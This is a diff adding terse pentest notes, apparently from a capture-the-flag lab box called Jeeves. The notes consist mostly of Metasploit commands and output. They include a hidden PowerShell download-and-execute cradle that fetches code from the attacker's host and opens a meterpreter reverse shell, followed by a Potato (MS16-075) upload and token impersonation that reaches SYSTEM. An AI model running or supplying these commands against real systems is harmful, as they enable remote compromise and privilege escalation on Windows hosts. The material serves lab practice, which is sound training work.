@@ -16,3 +16,107 @@ Simples HTTP Server in Python
 Download file in poweshell
 
 powershell.exe -Command Invoke-WebRequest -Uri http://10.10.14.196:8000/exploit.py -OutFile C:\Users\kohsuke\Desktop\exploit.py
+
+
+#############################/////////////////////////////////////////////////////////################################
+msf exploit(multi/script/web_delivery) > use exploit/multi/script/web_delivery 
+msf exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
+
+set target 2    -> PSH
+
+msf exploit(multi/script/web_delivery) > set uripath false
+uripath => false
+msf exploit(multi/script/web_delivery) > exploit
+[*] Exploit running as background job 13.
+
+[*] Started reverse TCP handler on 10.10.15.78:6466 
+[*] Using URL: http://0.0.0.0:8080/false
+[*] Local IP: http://192.168.90.117:8080/false
+[*] Server started.
+[*] Run the following command on the target machine:
+powershell.exe -nop -w hidden -c $Z=new-object net.webclient;$Z.proxy=[Net.WebRequest]::GetSystemWebProxy();$Z.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $Z.downloadstring('http://10.10.15.78:8080/false');
+
+---------------------------------------------
+___>>> alvo : powershell.exe -nop -w hidden -c $Z=new-object net.webclient;$Z.proxy=[Net.WebRequest]::GetSystemWebProxy();$Z.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $Z.downloadstring('http://10.10.15.78:8080/false');
+
+Remover a opcao (-w hidden)
+
+------------------------------------------
+
+msf exploit(multi/script/web_delivery) > [*] 10.10.10.63      web_delivery - Delivering Payload
+[*] Sending stage (179779 bytes) to 10.10.10.63
+[*] Meterpreter session 1 opened (10.10.15.78:6466 -> 10.10.10.63:49700) at 2018-04-02 21:24:35 -0300
+sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information              Connection
+  --  ----  ----                     -----------              ----------
+  1         meterpreter x86/windows  JEEVES\kohsuke @ JEEVES  10.10.15.78:6466 -> 10.10.10.63:49700 (10.10.10.63)
+
+msf exploit(multi/script/web_delivery) > sessions -i -1
+
+meterpreter > sysinfo 
+
+meterpreter > getuid 
+Server username: JEEVES\kohsuke
+
+meterpreter > upload /root/exploits/windows-kernel-exploits/MS16-075/potato.exe C:\\Users\\Public
+
+meterpreter > cd C:\\Users\\Public
+
+meterpreter > use incognito 
+
+meterpreter > execute -cH -f ./potato.exe
+
+############################################################
+meterpreter > execute -cH -f ./potato.exe
+[-] stdapi_sys_process_execute: Operation failed: The system cannot find the file specified.
+meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+[-] User token NT AUTHORITY\SYSTEM not found
+meterpreter > list_tokens 
+Usage: list_tokens <list_order_option>
+
+Lists all accessible tokens and their privilege level
+
+OPTIONS:
+
+    -g        List tokens by unique groupname
+    -u        List tokens by unique username
+##################################################################
+meterpreter > list_tokens -g
+
+meterpreter > use incognito 
+[-] The 'incognito' extension has already been loaded.
+meterpreter > execute -cH -f ./potato.exe
+Process 1592 created.
+Channel 3 created.
+
+meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
+
+meterpreter > getprivs 
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeImpersonatePrivilege
+SeIncreaseWorkingSetPrivilege
+SeShutdownPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+
+meterpreter > getuid 
+Server username: NT AUTHORITY\SYSTEM
+
+
+
+
+
+
